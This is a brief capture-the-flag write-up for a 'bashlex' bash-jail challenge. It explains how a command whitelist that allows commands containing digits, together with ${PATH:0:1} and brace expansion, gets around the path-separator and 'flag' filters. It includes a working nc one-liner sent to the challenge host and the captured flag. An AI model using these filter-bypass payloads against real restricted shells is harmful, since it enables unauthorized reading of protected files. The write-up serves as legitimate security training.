# bashlex

It's a bash jail based on some AST parser. It only whitelists harmless commands and blocks command substitution, etc.. It also blocks the path seperator `/` and the string `flag`.

The first bug is the implementation of the jail doesn't block comands that contain numbers. We can use bzip2 to read a file. The second bug is we can use environment variables to bypass the path seperator and expansion to bypass the `flag` block.

```
echo "bzip2 -z -c home${PATH:0:1}bashlex${PATH:0:1}fl{a..b}g.txt" | nc 34.90.44.21 1337
union{chomsky_go_lllllllll1}
```
